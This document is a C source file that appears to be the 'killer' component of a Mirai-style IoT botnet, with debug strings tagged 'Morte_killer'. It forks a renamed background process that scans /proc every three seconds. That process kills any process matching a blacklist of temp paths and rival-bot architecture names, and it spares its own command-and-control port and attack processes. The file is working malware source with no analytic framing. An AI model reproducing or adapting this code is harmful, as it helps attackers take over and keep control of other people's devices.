#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <dirent.h>
#include <unistd.h>

#include "headers/killer.h"
#include "headers/attack.h"
#include "headers/daemon.h"

extern int main_pid;
extern int watcher_pid;
extern int attack_ongoing[];
extern int cnc_port;

const char *whitelisted[] = {
    "/bin/",
    "/usr/bin/",
    "/sbin/",
    "/usr/sbin/",
    "/lib/",
    "/usr/lib/",
    "/usr/lib64/"
};

const char *blacklisted_path[] = {
    "/tmp",
    "/var",
    "/mnt",
    "/root",
    "/boot",
    "/sbin",
    "/home",
    "/dev",
    "/media",
    "/opt",
    "/.",
    "./",
    "(deleted)",
    "x86",
	"arc",
    "arm",
    "mips",
    "mpsl",
    "sh4",
    "arm5",
    "arm6",
	"arm7",
	"ppc",
	"spc",
	"x86_64",
	"m68k",
	"i686",
    "softbot.arm",
    "softbot.mpsl"
};

static const int whitelisted_ports[] = {
    22,
    80,
    443,
    53,
    123,
    25,
    110,
    143,
    993,
    995,
    3306,
    5432,
    6379
};

int is_whitelisted(pid_t pid, const char *cmdline, const char *exe, const char *maps) {
    if (pid == main_pid || pid == watcher_pid || pid == getpid() || pid == getppid())
        return 1;

    for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (attack_ongoing[i] == pid)
            return 1;
    }

    for (size_t i = 0; i < sizeof(whitelisted)/sizeof(whitelisted[0]); i++) {
        if (cmdline && strstr(cmdline, whitelisted[i])) 
            return 1;
        if (exe && strstr(exe, whitelisted[i]))
            return 1;
        if (maps && strstr(maps, whitelisted[i]))
            return 1;
    }

    return 0;
}

int is_blacklisted(const char *cmdline, const char *exe, const char *maps) {
    for (size_t i = 0; i < sizeof(blacklisted_path)/sizeof(blacklisted_path[0]); i++) {
        if (cmdline && strstr(cmdline, blacklisted_path[i]))
            return 1;
        if (exe && strstr(exe, blacklisted_path[i]))
            return 1;
        if (maps && strstr(maps, blacklisted_path[i]))
            return 1;
    }
    return 0;
}

int is_whitelisted_port(int port) {
    for (size_t i = 0; i < sizeof(whitelisted_ports)/sizeof(whitelisted_ports[0]); i++) {
        if (port == whitelisted_ports[i])
            return 1;
    }
    return cnc_port == port;
}

void killer_stat(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/stat", pid);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char line[1024];
        if (!fgets(line, sizeof(line), fp)) {
            fclose(fp);
            continue;
        }
        fclose(fp);

        char *start = strchr(line, '(');
        char *end = strrchr(line, ')');
        if (!start || !end) continue;

        char comm[256] = {0};
        strncpy(comm, start+1, end - start - 1);

        if (is_whitelisted(pid, comm, NULL, NULL)) 
            continue;

        if (is_blacklisted(comm, NULL, NULL)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Morte_killer] Killed pid : %d | Stat : %s\n", pid, comm);
            #endif
        }
    }
    closedir(dir);
}

void killer_exe(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256], exe[1024] = {0};
        snprintf(path, sizeof(path), "/proc/%d/exe", pid);

        ssize_t len = readlink(path, exe, sizeof(exe)-1);
        if (len <= 0) continue;
        exe[len] = 0;

        if (is_whitelisted(pid, NULL, exe, NULL)) 
            continue;

        if (is_blacklisted(NULL, exe, NULL)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Morte_killer] Killed pid : %d | Exe : %s\n", pid, exe);
            #endif
        }
    }
    closedir(dir);
}

void killer_ps(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char cmdline[1024] = {0};
        size_t n = fread(cmdline, 1, sizeof(cmdline)-1, fp);
        fclose(fp);
        if (!n) continue;

        for (int i = 0; i < n; i++) {
            if (cmdline[i] == '\0') cmdline[i] = ' ';
        }

        if (is_whitelisted(pid, cmdline, NULL, NULL)) 
            continue;

        if (is_blacklisted(cmdline, NULL, NULL)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Morte_killer] Killed pid : %d | Ps : %s\n", pid, cmdline);
            #endif
        }
    }
    closedir(dir);
}

void killer_maps(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/maps", pid);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char maps[4096] = {0};
        size_t n = fread(maps, 1, sizeof(maps)-1, fp);
        fclose(fp);
        if (!n) continue;

        if (is_whitelisted(pid, NULL, NULL, maps)) 
            continue;

        if (is_blacklisted(NULL, NULL, maps)) {
            kill(pid, SIGKILL);
            #ifdef DEBUG
            printf("[Morte_killer] Killed pid : %d | Maps : %s\n", pid, maps);
            #endif
        }
    }
    closedir(dir);
}

static pid_t find_pid_by_inode(unsigned int inode) {
    DIR *dir = opendir("/proc");
    if (!dir) return -1;

    struct dirent *ent;
    while ((ent = readdir(dir))) {
        if (ent->d_type != DT_DIR) continue;
        if (!isdigit(*ent->d_name)) continue;

        pid_t pid = atoi(ent->d_name);
        if (pid <= 1) continue;

        char fd_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd", pid);

        DIR *fddir = opendir(fd_path);
        if (!fddir) continue;

        struct dirent *fdent;
        while ((fdent = readdir(fddir))) {
            if (fdent->d_type != DT_LNK) continue;

            char link_path[512], link_buf[1024];
            snprintf(link_path, sizeof(link_path), "%s/%s", fd_path, fdent->d_name);

            ssize_t len = readlink(link_path, link_buf, sizeof(link_buf)-1);
            if (len <= 0) continue;
            link_buf[len] = 0;

            if (strstr(link_buf, "socket:[")) {
                unsigned int found_inode;
                if (sscanf(link_buf, "socket:[%u]", &found_inode) == 1) {
                    if (found_inode == inode) {
                        closedir(fddir);
                        closedir(dir);
                        return pid;
                    }
                }
            }
        }
        closedir(fddir);
    }
    closedir(dir);
    return -1;
}

void killer_tcp(void) {
    FILE *fp = fopen("/proc/net/tcp", "r");
    if (fp) {
        char line[512];
        fgets(line, sizeof(line), fp);

        while (fgets(line, sizeof(line), fp)) {
            unsigned int inode;
            char local_addr[128];

            if (sscanf(line, "%*d: %64[0-9A-Fa-f]:%*x %*s %*s %*s %*s %*s %*s %u",
                       local_addr, &inode) != 2) {
                continue;
            }

            char *colon = strrchr(local_addr, ':');
            if (!colon) continue;
            unsigned int port = strtoul(colon + 1, NULL, 16);

            if (is_whitelisted_port(port)) 
                continue;

            pid_t pid = find_pid_by_inode(inode);
            if (pid == -1) continue;

            char cmdline[1024] = {0};
            char path[256];
            snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

            FILE *cmd_fp = fopen(path, "r");
            if (cmd_fp) {
                fread(cmdline, 1, sizeof(cmdline)-1, cmd_fp);
                fclose(cmd_fp);

                for (int i = 0; i < sizeof(cmdline); i++) {
                    if (cmdline[i] == '\0') cmdline[i] = ' ';
                }

                if (is_whitelisted(pid, cmdline, NULL, NULL)) 
                    continue;

                if (is_blacklisted(cmdline, NULL, NULL)) {
                    kill(pid, SIGKILL);
                    #ifdef DEBUG
                    printf("[Morte_killer] Killed pid : %d | Tcp : %s\n", pid, cmdline);
                    #endif
                }
            }
        }
        fclose(fp);
    }

    fp = fopen("/proc/net/tcp6", "r");
    if (fp) {
        char line[512];
        fgets(line, sizeof(line), fp);

        while (fgets(line, sizeof(line), fp)) {
            unsigned int inode;
            char local_addr[128];

            if (sscanf(line, "%*d: %64[0-9A-Fa-f]:%*x %*s %*s %*s %*s %*s %*s %u",
                       local_addr, &inode) != 2) {
                continue;
            }

            char *colon = strrchr(local_addr, ':');
            if (!colon) continue;
            unsigned int port = strtoul(colon + 1, NULL, 16);

            if (is_whitelisted_port(port)) 
                continue;

            pid_t pid = find_pid_by_inode(inode);
            if (pid == -1) continue;

            char cmdline[1024] = {0};
            char path[256];
            snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

            FILE *cmd_fp = fopen(path, "r");
            if (cmd_fp) {
                fread(cmdline, 1, sizeof(cmdline)-1, cmd_fp);
                fclose(cmd_fp);

                for (int i = 0; i < sizeof(cmdline); i++) {
                    if (cmdline[i] == '\0') cmdline[i] = ' ';
                }

                if (is_whitelisted(pid, cmdline, NULL, NULL)) 
                    continue;

                if (is_blacklisted(cmdline, NULL, NULL)) {
                    kill(pid, SIGKILL);
                    #ifdef DEBUG
                    printf("[Morte_killer] Killed pid : %d | Tcp6 : %s\n", pid, cmdline);
                    #endif
                }
            }
        }
        fclose(fp);
    }
}

void killer_main(void) {
    pid_t pid = fork();
    if (pid != 0) return;

    char name[32];
    gen_name(name, sizeof(name));
    set_name(name);

    while (1) {
        killer_stat();
        killer_exe();
        killer_ps();
        killer_maps();
        killer_tcp();
        sleep(3);
    }
}
